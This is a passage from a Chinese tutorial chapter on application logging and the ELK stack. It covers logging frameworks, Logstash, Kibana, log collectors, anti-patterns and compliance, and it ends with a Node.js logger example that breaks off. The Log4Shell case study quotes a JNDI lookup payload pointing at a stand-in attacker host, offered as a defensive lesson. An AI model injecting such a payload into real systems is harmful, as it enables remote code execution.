    zap.Float64("amount", amount),
)
\`\`\`

#### Python（structlog）

\`\`\`python
import structlog
logger = structlog.get_logger()
logger.info("order_created", trace_id=trace_id, order_id=order_id, amount=amount)
\`\`\`

structlog 原生支持结构化日志，输出 JSON。

#### Node.js（Pino）

\`\`\`javascript
const pino = require('pino');
const logger = pino({ base: { service: 'order-service' } });
const child = logger.child({ traceId, userId });
child.info({ orderId, amount }, '订单创建');
\`\`\`

child logger 继承父 logger 的上下文，自动带上 traceId、userId，避免每条日志手动传。

---

### 十四、日志规范 Checklist

1. 统一用结构化日志（JSON）。
2. 必含字段：timestamp、level、service、traceId、message。
3. 级别使用规范：DEBUG 调试、INFO 关键节点、WARN 可恢复异常、ERROR 系统错误、FATAL 致命。
4. 不记录敏感信息（密码/Token/身份证号）。
5. 异常记录完整堆栈。
6. 不在循环内打高频日志。
7. 使用异步日志避免阻塞。
8. 日志按天滚动，设置保留天数。
9. access log 与业务日志分离。
10. 监控磁盘使用率，防止日志撑爆磁盘。
11. traceId 贯穿全链路（配合链路追踪）。
12. 审计日志独立存储、长期保留、不可篡改。

---

### 十五、生产案例

**案例 1：日志救了双十一**。某电商大促时订单成功率突降，但没有明显错误告警。工程师通过日志聚合发现，失败订单集中在某个机房，且失败前都有 "Redis 连接超时" 的 WARN。原来是该机房 Redis 主节点 CPU 飙升。切换到备用机房后恢复。WARN 日志起到了"早期预警"作用。

**案例 2：日志引发的故障**。某团队调试时加了 DEBUG 日志，上线忘关。高峰期每秒 5 万 QPS，每条请求打 10 条 DEBUG，一秒 50 万条日志。磁盘 IO 打满，应用线程阻塞在日志写入上，服务雪崩。教训：DEBUG 必须默认关闭，且日志框架要支持动态调整级别。

**案例 3：Log4Shell 事件**。2021 年 Log4j2 的 JNDI 注入漏洞（CVE-2021-44228），攻击者只需让服务器记录一条包含 \`\${jndi:ldap://evil.com/a}\` 的日志，就能触发远程类加载执行任意代码。半个互联网紧急升级。教训：永远不要在日志里解析用户输入的任意表达式；日志框架要及时打补丁。

**案例 4：无 traceId 的痛**。某微服务系统没有接入链路追踪，一次跨 5 个服务的调用失败，工程师要在 5 个系统的日志里靠时间戳和订单号人肉串联，花了 4 小时才定位。接入 traceId 后，同样的问题 10 分钟搞定。

---

### 十六、本章小结

日志是后端系统的"黑匣子"，承担着排障、审计、分析、监控、合规五大职责。核心要点：

1. **结构化优先**：用 JSON 格式，便于采集、解析、搜索。
2. **级别规范**：DEBUG/INFO/WARN/ERROR/FATAL 各司其职，不要滥用。
3. **关键字段齐全**：timestamp、level、service、traceId 是标配。
4. **安全第一**：敏感信息脱敏，审计日志独立。
5. **采集集中化**：Filebeat → Kafka → Logstash → ES → Kibana 是标准链路。
6. **保留有策略**：冷热分离，按类型设保留期。
7. **告警联动**：错误突增、关键词出现要能自动告警。
8. **traceId 串联**：配合链路追踪，让一次请求的日志可追溯。

下一章我们将学习监控与 Prometheus，看看如何用指标（Metrics）从宏观上把握系统健康状态。

**面试高频问题**：

- ELK 架构每层职责？为什么用 Kafka 缓冲？
- 结构化日志 vs 非结构化日志？
- 日志级别怎么选？业务异常算 ERROR 吗？
- 日志里能记密码吗？怎么做脱敏？
- Filebeat 如何保证不丢数据？
- ES 倒排索引原理？为什么日志搜索快？
- match 和 term 查询区别？
- 日志保留策略怎么定？冷热分离怎么做？
- Log4j2 异步日志原理？Log4Shell 漏洞是怎么回事？
- 为什么日志要带 traceId？

**延伸阅读**：

- Elasticsearch 官方文档：https://www.elastic.co/guide/
- Pino 文档：https://getpino.io/
- Logback 文档：http://logback.qos.ch/documentation.html
- 《Logging in Action》—— Phil Wilkins
- Log4Shell 漏洞分析：https://log4shell.huntress.com/

---

## 附录 A：ELK 架构深度剖析与容量规划

### A.1 各组件职责再梳理

ELK 不是三个独立产品的简单拼凑，而是一套协同工作的日志流水线。理解每个组件的边界，才能做对架构决策。

**Beats（采集层）**：轻量级数据采集器，部署在每台产生日志的机器上。Filebeat 采集文件日志，Metricbeat 采集系统指标，Packetbeat 采集网络数据，Heartbeat 做可用性探测。Beats 的核心设计是"轻"——用 Go 编写，内存占用低，不依赖 JVM，适合大规模部署。它内部维护一个注册表（registry），记录每个文件已读取到的 offset，即使重启也不会重复或遗漏。

**Kafka/MQ（缓冲层）**：位于 Beats 和 Logstash 之间的消息队列。为什么需要它？因为 Logstash 的处理速度有限（JVM GC、filter 计算），而日志产生速度可能突发飙升（如故障时错误日志暴增）。没有缓冲层，Logstash 处理不过来时 Beats 会被反压，最终丢失日志或阻塞业务。Kafka 的持久化特性保证了日志不丢，削峰填谷能力让下游可以按自己的节奏消费。

**Logstash（处理层）**：数据加工管道，负责解析、过滤、富化、转换。输入插件（input）接收数据，filter 插件做处理（grok 解析、mutate 修改字段、date 解析时间），输出插件（output）发送到 ES。Logstash 的优势是插件生态丰富、处理能力强；劣势是 JVM 内存开销大，单机吞吐通常在每秒 1-5 万条。因此生产环境通常用 Kafka 做缓冲，多台 Logstash 并行消费。

**Elasticsearch（存储与检索层）**：分布式搜索与分析引擎，基于 Lucene。日志写入 ES 后被分词、建索引，支持全文检索和聚合分析。ES 的核心概念：索引（Index，类似数据库）、分片（Shard，水平拆分）、副本（Replica，高可用）。日志场景下通常按天建索引（如 logs-2024-01-15），便于按时间范围查询和按天删除过期数据。

**Kibana（可视化层）**：Web 界面，提供 Discover（日志搜索）、Dashboard（图表仪表盘）、Alerting（告警）、DevTools（调试工具）等功能。Kibana 直接查询 ES，是人和 ELK 交互的窗口。

### A.2 数据流：从日志产生到可查询

一条日志的完整旅程：

1. **应用产生日志**：业务代码调用 logger.info()，日志框架格式化后写入文件（如 /var/log/app/app.log）。
2. **Filebeat 采集**：Filebeat 监控该文件，读取新增内容，发送到 Kafka 的指定 topic。
3. **Kafka 缓存**：日志进入 Kafka partition，按 key（如 service name）分区，保证同服务的日志有序。
4. **Logstash 消费**：Logstash 作为 Kafka consumer 拉取数据，经过 filter 链处理（grok 解析非结构化文本为字段、mutate 删除冗余字段、date 解析 @timestamp、geoip 根据 IP 添加地理位置）。
5. **ES 写入**：Logstash 将处理后的 JSON 文档通过 bulk API 批量写入 ES 的当日索引。ES 对每个字段建立倒排索引。
6. **Kibana 查询**：用户在 Kibana 搜索框输入关键词或 Lucene 查询语法，Kibana 转换为 ES Query DSL 发给 ES，ES 返回匹配文档，Kibana 渲染展示。

端到端延迟通常在 1-10 秒（取决于 Kafka 积压和 Logstash 处理速度）。如果需要亚秒级延迟，可以跳过 Kafka 直接 Filebeat 到 ES，但牺牲了缓冲能力。

### A.3 容量规划方法论

ELK 的容量规划是运维的核心难题，需要综合考虑日志量、保留期、查询性能和成本。

**步骤 1：估算日志量**。统计每个服务每天的日志量（GB），乘以服务数量，再乘以保留天数。例如 50 个服务，每个每天 2GB，保留 30 天等于 3000GB 原始日志。

**步骤 2：估算存储需求**。ES 存储包括原始数据 + 倒排索引 + 副本。经验值：ES 存储约为原始 JSON 的 1.5-2 倍（取决于字段数量和是否启用 _source）。如果有 1 个副本，再乘以 2。所以 3000GB 乘以 2 再乘以 2 等于 12000GB 即 12TB。

**步骤 3：规划分片**。每个分片是一个 Lucene 索引，有固定开销（建议每个分片不超过 50GB）。按天建索引时，每天一个索引，50GB 每天约需要 1-2 个分片。分片数等于主分片乘以 (1 加副本数)。

**步骤 4：规划节点**。ES 节点分三种角色：master（集群管理）、data（数据存储）、coordinating（查询协调）。data 节点数量等于总存储除以单节点磁盘。假设每节点 2TB SSD，12TB 需要 6 个 data 节点。JVM 堆建议 31GB（不超过 32GB 压缩指针阈值），剩余内存给 OS 文件缓存。

**步骤 5：预留 buffer**。实际部署要预留 30-50% 的余量，应对日志量增长和突发流量。

### A.4 性能调优要点

**写入优化**：
- 使用 bulk API 批量写入，每批 5-15MB，避免单条写入。
- 调大 indexing buffer（indices.memory.index_buffer_size，建议堆的 10-20%）。
- 对不需要全文检索的字段设置 type 为 keyword 而非 text，避免分词开销。
- 对不需要聚合的字段关闭 doc_values（但会失去聚合能力）。
- 写入时设置 refresh_interval 为 30s 或 -1（写入时不刷新，批量导入后手动 refresh）。

**查询优化**：
- 用 filter 上下文替代 query 上下文（filter 不算分且可缓存）。
- 避免深分页（from 加 size 超过 10000），用 search_after 或 scroll。
- 时间范围查询加上 @timestamp 过滤，利用时间索引的物理排序。
- 高基数聚合（如对 user_id 聚合）使用 cardinality 聚合近似计算。
- 冷热分离：近期数据放热节点（SSD），历史数据迁移到冷节点（HDD），降低成本。

---

## 附录 B：Logstash 配置实战与 Grok 模式

### B.1 Logstash 配置结构

Logstash 的配置文件分为三段：input、filter、output。数据从 input 进入，经过 filter 链处理，从 output 发出。每条日志称为一个 event，在管道中以 Ruby Hash 形式流转。

\`\`\`text
input {
  kafka {
    bootstrap_servers => "kafka1:9092,kafka2:9092"
    topics => ["app-logs"]
    group_id => "logstash-consumer"
    consumer_threads => 4
    decorate_events => true
  }
}

filter {
  grok {
    match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} %{LOGLEVEL:level} %{GREEDYDATA:msg}" }
  }
  date {
    match => ["timestamp", "ISO8601"]
    target => "@timestamp"
  }
  mutate {
    remove_field => ["timestamp", "@version"]
  }
}

output {
  elasticsearch {
    hosts => ["es1:9200", "es2:9200"]
    index => "logs-%{+YYYY.MM.dd}"
  }
}
\`\`\`

### B.2 Grok 模式详解

Grok 是 Logstash 最常用的 filter，本质是"正则表达式加命名捕获"。它预定义了大量模式（如 TIMESTAMP_ISO8601、IP、NUMBER、WORD），组合这些模式就能解析复杂日志。

常用内置模式：
- **IP:client_ip**：匹配 IP 地址，捕获到 client_ip 字段
- **WORD:method**：匹配单词（字母数字下划线）
- **NUMBER:duration:int**：匹配数字，类型转为 int
- **GREEDYDATA:message**：贪婪匹配任意字符，通常放在最后
- **COMBINEDAPACHELOG**：预组合的 Apache 日志模式

Grok 的性能问题是众所周知的：正则匹配很慢，复杂模式处理一条日志可能要 1-5ms。优化方法：
1. 尽量用更精确的模式替代 GREEDYDATA。
2. 使用 grok 的 break_on_match 设为 true，匹配到就停止。
3. 对于结构化日志（JSON），直接用 json filter，跳过 grok。
4. 使用 timeout_millis 避免灾难性回溯。

### B.3 常见日志的 Grok 模式

Java 异常堆栈解析：

\`\`\`text
%{TIMESTAMP_ISO8601:timestamp} %{LOGLEVEL:level} \[%{DATA:thread}\] %{DATA:logger} - %{GREEDYDATA:msg}
\`\`\`

Nginx access log 解析：

\`\`\`text
%{IPORHOST:remote_addr} - %{DATA:remote_user} \[%{HTTPDATE:time_local}\] "%{WORD:method} %{URIPATHPARAM:request} HTTP/%{NUMBER:http_version}" %{NUMBER:status:int} %{NUMBER:bytes:int} "%{DATA:referrer}" "%{DATA:agent}"
\`\`\`

### B.4 Logstash 替代方案

由于 Logstash 的 JVM 开销，很多团队在寻找替代品：
- **Fluentd/Fluent Bit**：C 加 Ruby 混编，内存占用更低，CNCF 项目，K8s 环境首选。
- **Vector**：Rust 编写，性能极高，配置式 pipeline，Datadog 开源。
- **Filebeat 内置 processor**：简单场景下 Filebeat 自带的 processor 就够用，无需 Logstash。

对于已经是 JSON 格式的结构化日志，可以直接用 Filebeat 的 json processor 解析后直送 ES，完全跳过 Logstash，大幅降低资源开销。

---

## 附录 C：Kibana 可视化与 Dashboard 构建

### C.1 Kibana 核心功能

Kibana 是 ELK 的可视化前端，核心功能模块：

**Discover**：日志搜索与浏览。支持 Lucene 查询语法（如 level:ERROR AND service:order）和 KQL（Kibana Query Language）。可以按时间范围过滤，按字段筛选，查看单条日志详情。

**Visualize**：创建图表。支持柱状图、折线图、饼图、数据表、指标卡、热力图、地图等。每个可视化基于一个 ES 聚合查询。

**Dashboard**：将多个 Visualize 组合成仪表盘。支持时间过滤器联动、面板拖拽布局、自动刷新。

**Alerting**：基于 ES 查询条件的告警。当查询结果满足阈值时触发告警，发送到邮件、Slack、Webhook。

**DevTools**：开发者工具，直接编写和执行 ES Query DSL，是调试 ES 查询的利器。

### C.2 常见 Dashboard 设计

**系统总览 Dashboard**：
- 顶部：指标卡显示今日日志总量、ERROR 数、WARN 数、最慢请求耗时
- 中部：折线图按分钟展示日志量趋势（分 level 堆叠）
- 中部：柱状图按 service 展示 ERROR 分布
- 底部：数据表列出最近 20 条 ERROR 日志

**单服务 Dashboard**：
- 折线图：QPS、错误率、P99 延迟
- 饼图：错误类型分布
- 热力图：错误按小时分布，发现时间规律
- 数据表：慢请求 Top 10

好的 Dashboard 设计原则：一屏看清核心指标、异常一眼可见、下钻路径清晰、避免图表堆砌。

### C.3 KQL 查询语法速查

\`\`\`text
# 精确匹配
level: "ERROR"
service: "order-service"

# 布尔组合
level: "ERROR" AND service: "order-service"
level: ("ERROR" OR "FATAL")

# 范围查询
response_time >= 1000
status_code: [400 TO 499]

# 模糊匹配（通配符）
message: *timeout*
logger: com.example.*

# 否定
NOT level: "DEBUG"
\`\`\`

KQL 比 Lucene 语法更友好，支持自动补全和字段提示，是 Kibana 推荐的查询方式。

### C.4 告警规则示例

典型告警场景：
- ERROR 日志 5 分钟内超过 100 条，立即告警
- 特定关键词（OutOfMemoryError、Connection refused）出现，立即告警
- 某服务 ERROR 率超过 5%，告警
- 日志量骤降 50%（可能采集器故障），告警

告警要避免"狼来了"——设置合理的阈值和聚合窗口，配合告警分组和抑制规则，减少告警疲劳。

---

## 附录 D：日志采集方案对比（Filebeat/Fluentd/Vector）

### D.1 Filebeat

Filebeat 是 Elastic 官方的轻量级日志采集器，Go 编写。

**优势**：
- 与 ELK 深度集成，开箱即用
- 内置 registrar 机制，记录文件 offset，重启不丢数据
- 支持 harvester（每个文件一个 goroutine 持续读取）和 prospector（发现新文件）
- 内置 processor 可做简单过滤和字段加工
- 资源占用低（通常 20-50MB 内存）

**劣势**：
- 功能相对单一，复杂处理需要 Logstash 配合
- 生态绑定 Elastic

**典型配置**：

\`\`\`yaml
filebeat.inputs:
- type: log
  paths:
    - /var/log/app/*.log
  fields:
    service: order-service
    env: production
  fields_under_root: true

output.kafka:
  hosts: ["kafka1:9092"]
  topic: "app-logs"
  partition.round_robin:
    reachable_only: true
\`\`\`

### D.2 Fluentd / Fluent Bit

Fluentd 是 CNCF 毕业项目，Ruby 加 C 混编，插件生态极其丰富。Fluent Bit 是其轻量版，C 编写，专为边缘和嵌入式场景设计。

**优势**：
- 插件生态最丰富（500+ 插件），支持几乎所有输入输出
- K8s 原生支持，是 K8s 日志采集的事实标准
- 协议灵活，支持转发、缓冲、重试
- 不绑定特定后端，可同时输出到 ES、S3、Kafka 等

**劣势**：
- Fluentd（Ruby 版）内存占用较高，性能不如 Filebeat
- 配置语法较复杂

### D.3 Vector

Vector 是 Datadog 开源的 Rust 日志采集器，主打高性能。

**优势**：
- Rust 编写，性能极高（吞吐量是 Filebeat 的 5-10 倍）
- 统一处理 logs、metrics、traces 三种数据
- 配置式 pipeline（TOML/YAML），可读性强
- 内置 200+ 组件（sources、transforms、sinks）

**劣势**：
- 社区相对年轻，生态不如 Fluentd
- 文档和最佳实践积累较少

### D.4 选型建议

| 场景 | 推荐 |
|------|------|
| 已有 ELK 栈，采集文件日志 | Filebeat |
| K8s 环境，需要统一采集 | Fluent Bit |
| 超大规模，性能优先 | Vector |
| 多后端输出（同时写 ES 加 S3） | Fluentd |
| 简单场景，无需复杂处理 | Filebeat processor |

### D.5 采集器共性要点

无论选哪个采集器，都要关注：
1. **At-least-once 语义**：通过 ACK 机制和本地缓冲保证不丢数据
2. **背压控制**：下游慢时降低采集速度，避免 OOM
3. **多路输出**：同时发往 Kafka 和 ES，实现多副本
4. **资源限制**：CPU 和内存上限，避免影响业务进程
5. **热更新配置**：不重启即可更新采集规则

## 附录 E：日志反模式深度解析

### E.1 在循环里打日志

反模式示例：

\`\`\`java
for (Order order : orders) {
    logger.info("processing order: " + order.getId());
    process(order);
}
// 如果 orders 有 10000 条，就产生 10000 条日志
\`\`\`

问题：循环内打日志会导致日志量爆炸，尤其是在批量处理场景。一条 INFO 日志看似无害，但乘以循环次数就是灾难。

正确做法：循环外打一条汇总日志，如"processed 10000 orders in 5s, failed: 3"。循环内只在异常时打 WARN 或 ERROR。

### E.2 日志里拼接大对象

反模式示例：

\`\`\`java
logger.info("request: " + JSON.toJSONString(hugeRequest));
\`\`\`

问题：将整个请求对象序列化到日志，可能产生几 KB 甚至几 MB 的日志行。ES 对超长字段（超过 ignore_above）会跳过索引，且大日志行会导致网络和存储浪费。

正确做法：只记关键标识（如 orderId、userId），需要详情时根据标识去查库。或使用采样（1/100 才记详情）。

### E.3 用 println 代替 logger

反模式示例：

\`\`\`java
System.out.println("user logged in: " + userId);
\`\`\`

问题：System.out 是同步阻塞的，没有级别控制，没有格式化，无法被采集系统正确识别。生产环境绝对禁止。

### E.4 异常被吞掉

反模式示例：

\`\`\`java
try {
    riskyOperation();
} catch (Exception e) {
    // 静默吞掉异常，连日志都不打
}
\`\`\`

问题：这是最危险的日志反模式。异常被静默吞掉后，系统会继续运行但处于错误状态，故障无法被发现。排查时完全没有线索。

正确做法：至少打一条 WARN 日志记录异常信息，即使确信可以忽略也要说明原因。

### E.5 同步阻塞打日志

反模式示例：

\`\`\`java
logger.info("processing"); // 当前线程阻塞等待日志写完
\`\`\`

问题：同步日志在高并发下会成为瓶颈。磁盘 I/O 是慢操作，大量线程阻塞在日志写入上，导致吞吐量骤降。

正确做法：使用异步日志（如 Log4j2 的 AsyncLogger、Logback 的 AsyncAppender）。异步日志将日志事件放入队列，由独立线程写入磁盘，业务线程几乎不受影响。

### E.6 日志没有上下文

反模式示例：

\`\`\`java
logger.error("operation failed");
// 没有说明是什么操作、什么参数、什么用户
\`\`\`

问题：看到"operation failed"这条日志，你完全不知道是哪个操作、为什么失败。故障排查时这条日志毫无价值。

正确做法：日志要带足够上下文。"order payment failed, orderId=12345, userId=67890, amount=99.9, reason=insufficient balance"。

### E.7 日志级别滥用

反模式示例：

\`\`\`java
logger.error("user login with wrong password"); // 这是业务正常情况，不是系统错误
\`\`\`

问题：级别混乱会导致告警失效。如果 ERROR 里混了大量业务正常情况，真正的系统错误就会被淹没。

原则：ERROR 是"需要人工介入的系统异常"，WARN 是"可能有问题但系统自愈了"，INFO 是"关键业务节点"，DEBUG 是"调试信息"。用户输错密码是业务正常流程，用 INFO 或 WARN 即可，绝不应该用 ERROR。

### E.8 日志格式不统一

问题：同一个系统内，有的服务用 JSON 格式，有的用纯文本，有的字段名叫 userId 有的叫 uid。采集和查询时极其痛苦。

正确做法：全公司统一日志格式规范，至少包含 timestamp、level、service、traceId、message 五个标准字段。新服务必须遵循，老服务逐步迁移。

---

## 附录 F：多语言日志框架对比

### F.1 Java 生态

**Log4j2**：Apache 旗舰日志框架，性能最强（AsyncLogger 基于 Disruptor，吞吐量百万级每秒）。支持结构化日志（JSON layout）、过滤器、插件。Log4Shell 事件后修复了 JNDI 漏洞，但需注意版本（2.17.1 以上）。

**Logback**：Log4j 作者的下一代框架，Spring Boot 默认集成。性能略低于 Log4j2 但配置更直观。支持 RollingFileAppender（按时间/大小滚动）。

**SLF4J**：日志门面（Facade），不提供实现，只定义 API。业务代码面向 SLF4J 编程，底层可切换 Logback/Log4j2/JUL。这是 Java 日志的最佳实践——解耦 API 和实现。

典型配置（logback.xml 片段）：

\`\`\`xml
<configuration>
  <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
    <file>/var/log/app/app.log</file>
    <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
      <fileNamePattern>/var/log/app/app.%d{yyyy-MM-dd}.log</fileNamePattern>
      <maxHistory>30</maxHistory>
    </rollingPolicy>
    <encoder>
      <pattern>%d{ISO8601} %level [%thread] %logger - %msg%n</pattern>
    </encoder>
  </appender>
  <root level="INFO">
    <appender-ref ref="FILE"/>
  </root>
</configuration>
\`\`\`

### F.2 Go 生态

**zap**：Uber 开源，性能极强（零分配设计）。提供 SugaredLogger（易用）和 Logger（高性能）两种 API。

\`\`\`go
logger, _ := zap.NewProduction()
defer logger.Sync()
logger.Info("order created",
    zap.String("orderId", "12345"),
    zap.Int("amount", 99),
)
\`\`\`

**zerolog**：JSON 优先，性能与 zap 接近，API 更简洁。

**logrus**：最早流行的结构化日志库，但性能不如 zap/zerolog，新项目不推荐。

### F.3 Python 生态

**logging**：标准库，功能完整但 API 较繁琐。通过 dictConfig 配置。

**structlog**：结构化日志库，输出 JSON，与标准 logging 兼容。

**loguru**：第三方库，API 极简（from loguru import logger; logger.info("msg")），开箱即用，新项目推荐。

### F.4 Node.js 生态

**Pino**：性能极强（比 Winston 快 3-5 倍），JSON 输出，异步写入。推荐生产使用。

**Winston**：最流行的 Node.js 日志库，支持多 transport（文件、控制台、HTTP），但性能一般。

**Bunyan**：JSON 优先，有 CLI 工具美化输出，但维护不活跃。

### F.5 跨语言共性

无论哪种语言，好的日志框架都应具备：
1. **结构化输出**：JSON 格式，字段可被检索
2. **级别控制**：运行时动态调整级别
3. **上下文传递**：MDC（Java）/ context（Go）传递 traceId
4. **异步写入**：不阻塞业务线程
5. **滚动策略**：按时间/大小切分文件，自动清理
6. **多输出**：同时写文件、控制台、远程

---

## 附录 G：日志安全与合规

### G.1 敏感信息脱敏

日志中最常见的合规问题是泄露敏感信息。GDPR、PCI-DSS、等保 2.0 都对个人信息保护有严格要求。

**需要脱敏的字段**：
- 密码、密钥、Token：完全打码
- 手机号：保留前 3 后 4（138****5678）
- 身份证号：保留前 6 后 4（110101****1234）
- 银行卡号：保留后 4 位
- 邮箱：保留首字符和域名
- IP 地址：保留前 3 段（192.168.1.*）

**实现方式**：
1. **日志框架层**：自定义 layout/pattern，对特定字段脱敏
2. **代码层**：封装日志工具类，对敏感字段自动脱敏
3. **采集层**：Filebeat/Logstash processor 做正则替换
4. **存储层**：ES ingest pipeline 做字段脱敏

多层脱敏是最稳妥的方案：代码层做第一道防线（防止明文进入日志文件），采集层做第二道（兜底过滤遗漏的敏感信息）。

### G.2 日志防篡改

审计日志要求不可篡改。常见方案：
- **WORM 存储**：写入一次不可修改，AWS S3 Object Lock、阿里云 OSS WORM
- **追加写**：日志文件以 append-only 模式打开，禁用修改
- **哈希链**：每条日志包含前一条的哈希，形成链式结构
- **数字签名**：批量签名，保证完整性
- **上链**：高安全场景将日志哈希上链（区块链）

### G.3 日志保留合规

不同行业对日志保留期有法规要求：
- **金融（SOX）**：交易相关日志保留 7 年
- **医疗（HIPAA）**：访问日志保留 6 年
- **等保 2.0**：日志至少保留 6 个月
- **GDPR**：个人数据保留不超过必要期限（最小化原则）
- **PCI-DSS**：审计日志至少 1 年在线加 1 年离线

ES 实现保留策略：用 ILM（Index Lifecycle Management）自动滚动、归档、删除索引。配置 hot/warm/cold/delete 四个阶段，按索引年龄自动迁移和清理。

### G.4 访问控制

日志中可能包含敏感信息，需要访问控制：
- **ES 层**：启用 X-Pack Security，基于角色的访问控制（RBAC）
- **Kibana 层**：Spaces 隔离不同团队，权限按角色分配
- **审计**：记录谁在什么时间查询了什么日志（元日志）
- **脱敏视图**：普通用户看到脱敏后的日志，管理员可申请查看原文

### G.5 Log4Shell 事件的深远影响

2021 年的 Log4Shell（CVE-2021-44228）是日志安全史上里程碑事件。攻击者只需让服务器记录一条包含 JNDI 表达式的日志，就能触发远程类加载执行任意代码。半个互联网紧急升级。

教训：
1. 日志框架不应解析用户输入中的任意表达式
2. 依赖库要及时打补丁，建立 SBOM（软件物料清单）
3. 出站网络要限制（JNDI 需要外部 LDAP/RMI 连接）
4. Java Security Manager 或类似沙箱可以限制攻击面

---

## 附录 H：日志面试速查与实战清单

### H.1 面试高频问题补充

- Filebeat 的 registrar 机制是什么？如何保证不丢数据？
- Logstash 的 grok 为什么慢？怎么优化？
- ES 的倒排索引结构？FST 是什么？
- ES 为什么用 LSM-Tree 思想而不是 B-Tree？
- 冷热分离怎么实现？ILM 怎么配置？
- 异步日志的 Disruptor 原理？为什么比队列快？
- 日志采样怎么实现？采样率怎么定？
- 如何实现日志的 traceId 贯穿微服务调用链？
- Kafka 在日志架构中的作用？为什么不用 Redis？
- ES 的 refresh、flush、merge 各是什么？
- mapping 的 dynamic 和 strict 模式区别？
- 如何排查"日志查不到"的问题？

### H.2 日志系统建设清单

**基础建设**：
- 统一日志格式（JSON 加必要字段）
- 部署 Filebeat 采集所有服务日志
- Kafka 缓冲层（至少 3 副本）
- Logstash 集群（至少 2 节点）做数据清洗
- ES 集群（3 master 加 N data），冷热分离
- Kibana 面板，按服务/环境分 Space

**规范化**：
- 制定日志级别规范文档
- 敏感字段脱敏方案落地
- traceId 全链路打通
- 日志保留策略（ILM 自动化）

**告警**：
- ERROR 突增告警（5 分钟阈值）
- 关键词告警（OOM、Connection refused）
- 日志量骤降告警（采集器故障）
- 告警值班排班加降噪

**进阶**：
- 日志转指标（错误率、延迟分布）
- 日志关联链路追踪
- 智能异常检测（基于 ML）
- 日志成本优化（采样加冷存储）

### H.3 日志排查实战流程

1. **确定时间范围**：用户反馈问题发生的时间点
2. **确定关键字段**：userId、orderId、traceId 等
3. **Kibana 搜索**：用 KQL 组合条件筛选
4. **按时间排序**：找到第一条相关日志
5. **追踪 traceId**：用 traceId 查出完整调用链日志
6. **定位异常**：找到 ERROR/FATAL 级别日志
7. **分析堆栈**：从异常堆栈定位代码行
8. **关联排查**：查看同时间段其他服务的日志
9. **复现验证**：在测试环境复现并验证修复

### H.4 日志成本优化

ELK 是个烧钱的系统，成本优化是长期课题：
1. **采样**：DEBUG 日志采样 1/100，INFO 采样 1/10，ERROR 全量
2. **冷热分离**：热数据 SSD + 副本，冷数据 HDD 无副本
3. **压缩**：ES 默认 LZ4，可换 best_compression 节省 25% 空间
4. **字段裁剪**：不需要的字段在采集层就丢弃，不入 ES
5. **降级存储**：超过保留期的日志归档到 S3/OSS，ES 只保留近期
6. **按需查询**：冷数据用 Async Search 异步查询，不占用热资源

### H.5 本章总结

日志系统是可观测性的基石。好的日志实践不是"会打 logger.info"那么简单，而是从格式规范、级别策略、采集架构、存储检索、安全合规到告警联动的系统工程。投资日志建设，回报是故障排查时间从小时级降到分钟级。

下一章我们将学习监控与 Prometheus，看看如何用指标（Metrics）从宏观上把握系统健康状态，与日志的微观记录形成互补。

---

**最终速查表**：

| 概念 | 一句话总结 |
|------|-----------|
| 结构化日志 | JSON 格式，机器可读，字段可检索 |
| 日志级别 | DEBUG 调试 / INFO 关键节点 / WARN 异常但自愈 / ERROR 需介入 / FATAL 系统不可用 |
| MDC | 线程上下文，传递 traceId 等信息 |
| ELK | Elasticsearch 加 Logstash 加 Kibana 日志平台 |
| EFK | EFK 用 Fluentd 替代 Logstash，K8s 友好 |
| Filebeat | 轻量日志采集器，Go 编写，基于 offset 不丢数据 |
| Grok | Logstash 的正则解析 filter，预定义模式库 |
| ILM | ES 索引生命周期管理，自动滚动归档删除 |
| Log4Shell | Log4j2 JNDI 注入漏洞，日志安全里程碑 |
| WORM | Write Once Read Many，审计日志防篡改存储 |
`,
    code: `// ============================================================
// 日志与 ELK —— 可运行示例
// 实现结构化日志框架：分级输出 + MDC 上下文 + traceId 串联
// ============================================================

const crypto = require('crypto');

// ---------- 1. 日志级别 ----------
const LEVELS = { DEBUG: 10, INFO: 20, WARN: 30, ERROR: 40, FATAL: 50 };
const LEVEL_NAMES = Object.fromEntries(Object.entries(LEVELS).map(([k, v]) => [v, k]));

// ---------- 2. 日志追加器（Appender） ----------
class ConsoleAppender {
  emit(record) { console.log(JSON.stringify(record)); }
}

// 内存文件 appender，模拟写文件（采集到 ELK）
class FileAppender {
  constructor() { this.lines = []; }
  emit(record) { this.lines.push(JSON.stringify(record)); }
  size() { return this.lines.length; }
}

// ---------- 3. 采样器 ----------
class Sampler {
  constructor(rate) { this.rate = rate; this.count = 0; }
  allow() { this.count++; return this.count % this.rate === 0; }
}

// ---------- 4. 日志上下文（模拟 MDC） ----------
class LogContext {
  constructor() { this.map = new Map(); }
  put(k, v) { this.map.set(k, v); }
  get(k) { return this.map.get(k); }
  clear() { this.map.clear(); }
  snapshot() { return Object.fromEntries(this.map); }
}

// ---------- 5. 日志过滤器 ----------
class LevelFilter {
  constructor(minLevel) { this.minLevel = minLevel; }
  accept(record) { return record._levelVal >= this.minLevel; }
}

// ---------- 6. Logger 核心 ----------
class Logger {
  constructor(name, options = {}) {
    this.name = name;
    this.level = options.level || 'INFO';
    this.appenders = options.appenders || [new ConsoleAppender()];
    this.context = new LogContext();
    this.filter = new LevelFilter(LEVELS[this.level]);
    this.sampler = options.sampler || null;  // 仅对 DEBUG 采样
  }

  child(extra) {
    const c = new Logger(this.name, { level: this.level, appenders: this.appenders });
    // 继承父上下文
    for (const [k, v] of this.context.map) c.context.put(k, v);
    for (const [k, v] of Object.entries(extra)) c.context.put(k, v);
    return c;
  }

  _log(level, msg, fields = {}) {
    const levelVal = LEVELS[level];
    // 级别过滤
    if (levelVal < LEVELS[this.level]) return;
    // DEBUG 采样
    if (level === 'DEBUG' && this.sampler && !this.sampler.allow()) return;

    const record = {
      timestamp: new Date().toISOString(),
      level,
      service: this.name,
      message: msg,
      ...this.context.snapshot(),
      ...fields,
    };
    for (const a of this.appenders) a.emit(record);
  }
  debug(msg, f) { this._log('DEBUG', msg, f); }
  info(msg, f) { this._log('INFO', msg, f); }
  warn(msg, f) { this._log('WARN', msg, f); }
  error(msg, f) { this._log('ERROR', msg, f); }
  fatal(msg, f) { this._log('FATAL', msg, f); }
}

// ---------- 7. 模拟一次请求的完整日志链 ----------
// 用 traceId 串联：网关入口 → 业务函数 A → 业务函数 B
function gatewayEntrance(requestId, userId) {
  const traceId = crypto.randomBytes(8).toString('hex');
  // 根 logger，注入 traceId/requestId/userId 到 MDC
  const logger = new Logger('gateway-service', { level: 'INFO' });
